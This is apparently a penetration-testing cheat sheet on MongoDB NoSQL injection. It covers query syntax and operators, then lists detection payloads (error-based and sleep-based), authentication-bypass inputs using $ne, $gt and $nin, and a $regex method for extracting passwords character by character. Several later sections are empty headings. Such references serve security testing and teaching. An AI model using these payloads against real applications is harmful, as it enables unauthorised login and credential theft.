# Web Applications - NoSQL Injection - mongoDB

/!\ IMPORTANT /!\

Note that blind NoSQL injections are only available in versions of
MongoDB prior to 2.4 (released in March 2013). Since this version, the global
variable `db` was completely removed.

On MongoDB 2.4 and subsequent versions, NoSQL injection can only be leveraged
to:
  - bypass filter, such as authentication mechanism
  - conduct a Denial of Service of the server

### Overview and syntax reference

MongoDB stores data as BSON documents, i.e. data records, in collections;
the collections in databases.
A record in MongoDB is a document, which is a data structure composed of field
and value pairs. MongoDB documents are similar to JSON objects. The values of
fields may include other documents, arrays, and arrays of documents.

###### CRUD Operations

The CRUD operations allows to create, read, update, and delete documents.

*Read operations*

| Function | Description | Example |
|----------|-------------|---------|
| db.collection.find() | Retrieves documents from a collection | db.users.find( { username: req.body.username, password: req.body.password } ) |
| db.collection.findOne | Returns one document that satisfies the specified query criteria in the collection | db.users.findOne( { "username": req.body.username, "password": req.body.password } )  |

*Create operations*

If the collection does not currently exist, insert operations will create the collection.

| Function | Description | Example |
|----------|-------------|---------|
| db.collection.insertOne | Deprecated in major driver, inserts a document or documents into a collection | *See db.collection.insertOne() and db.collection.insertMany() below* |
| db.collection.insertOne() | New in version 3.2, inserts a document into a collection |  db.products.insertOne( { "item": "card", "qty": 15 } ) |
| db.collection.insertMany() | New in version 3.2, inserts multiple documents into a collection |  db.products.insertMany( [ { "item": "card", "qty": 15 }, { "item": "enveloppe", "qty": 20 }, { "item": "stamps" , "qty": 30 } ] ); |

*Update operations*

| Function | Description | Example |
|----------|-------------|---------|
| db.collection.update() | Deprecated in major driver, modifies an existing document or documents in a collection | *See db.collection.updateOne() and db.collection.updateMany() below* |
| db.collection.updateOne() | New in version 3.2, modifies the first matching document in the collection that matches the filter | db.products.updateOne( { "item" : "card" }, { $set: { "qty" : 25 } } ) |
| db.collection.updateMany() | New in version 3.2, updates multiple documents within the collection based on the filter | db.products.updateMany( { "qty": { $lt: 5 } }, { $set: { "lowStock": true } } ) |
| db.collection.replaceOne() | New in version 3.2, replaces a single document within the collection based on the filter |  db.products.replaceOne( { "item": "enveloppe" }, {  "item": "envelope", "qty": 20 } ) |

*Delete operations*

| Function | Description | Example |
|----------|-------------|---------|
| db.collection.remove() | Deprecated in major driver, removes a single or multiple documents from a collection | db.products.remove( { "qty": { $lte: 20 } } ) <br/> # Just one <br/> db.products.remove( { "qty": { $lte: 20 } }, true ) <br/> # Just one after version 2.6 <br/> db.products.remove( { "qty": { $lte: 20 } }, { "justOne": true } )  |
| db.collection.deleteOne() | New in version 3.2, removes a single document from a collection | db.collection.deleteOne( { "item": "envelope" } ) |
| db.collection.deleteMany() | New in version 3.2, removes all documents that match the filter from a collection | db.collection.deleteMany( { "qty": { $lte: 0 } } ) |

###### Operators

*Logical operators*

| Operator | Description |
|----------|-------------|
| $or	| Joins query clauses with a logical OR returns all documents that match the conditions of either clause |
| $and | Joins query clauses with a logical AND returns all documents that match the conditions of both clauses |
| $not | Inverts the effect of a query expression and returns documents that do not match the query expression |
| $nor |	Joins query clauses with a logical NOR returns all documents that fail to match both clauses |

*Comparison operators*

| Operator | Description |
|----------|-------------|
| $eq	| Matches values that are equal to a specified value |
| $ne	| Matches all values that are not equal to a specified value |
| $gt	| Matches values that are greater than a specified value |
| $gte | Matches values that are greater than or equal to a specified value |
| $lt	| Matches values that are less than a specified value |
| $lte | Matches values that are less than or equal to a specified value |
| $nin | Matches none of the values specified in an array |
| $in	| Matches any of the values specified in an array |

*Evaluation operators*

| Operator | Description |
|----------|-------------|
| $expr | Allows use of aggregation expressions within the query language |
| $jsonSchema | Validate documents against the given JSON Schema |
| $mod | Performs a modulo operation on the value of a field and selects documents with a specified result |
| $regex | Selects documents where values match a specified regular expression |
| $text | Performs text search |
| $where | Matches documents that satisfy a JavaScript expression |

### Injection detection

Two ways can be used to detect user inputs being passed un-sanitized in a
MongoDB operation:
  - special characters that would trigger a database error
  - using server-side JavaScript execution for time-based detection

```
# Error based detection
'"\;{}
'"\%3b{}
%27%22%5c%3b%7b%7d

# Time based detection - 10 seconds
# Using MongoDB builtin sleep()
1';sleep(10000);'
1'%3bsleep(10000)%3b'
# Custom sleep
1';var d = new Date(); var cd = null; do { cd = new Date(); } while(cd-d < 10000);var foo='bar
1';var%20d%20=%20new%20Date();%20var%20cd%20=%20null;%20do%20{%20cd%20=%20new%20Date();%20}%20
a'+(function(){if(typeof tmczl==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<10000);tmczl=1;}}())+'
a'%2b(function(){if(typeof+tmczl%3d%3d%3d"undefined"){var+a%3dnew+Date()%3bdo{var+b%3dnew+Date()%3b}while(b-a<20000)%3btmczl%3d1%3b}}())%2b'
```

### Injection queries

###### Authentication bypass

MongoDB authentication bypass can be achieved using the `$ne` or `$gt`
operators.  
While the parameters can be left blank for the injection, a pre
check on the supplied data may require values to be provided.

```
# PHP - abuse the way PHP initialize arrays
# GET/POST key-value pairs
username[$ne]=&password[$ne]=
username[$ne]=we&password[$ne]=we
username[$gt]=&password[$gt]=
username[$gt]=we&password[$gt]=we
username[$nin][]=user1&username[$nin][]=user2&password[$ne]=we

# POST JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "we"}, "password": {"$ne": "we"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

###### Authentication extract password

An injection a login form can be used to retrieve an user clear text password.
The ` $regex` evaluation operator allows to determine the password length and
a letter by letter matching.  

The authentication will fail as soon as the condition specified by the regex
evaluate to false.

```
# Determine password length
username=<USERNAME>&password[$regex]=.{1}
...
username=<USERNAME>&password[$regex]=.{<N>}

# Extract clear-text password
username=<USERNAME>&password[$regex]=<LETTER>.{<PASSWORD_LENGTH>}
...
username=<USERNAME>&password[$regex]=p@ss.{<PASSWORD_LENGTH - 4>}
```

###### Meta information gathering

###### Databases enumeration

###### Tables and columns enumeration

###### Data exfiltration

###### Denial of Service
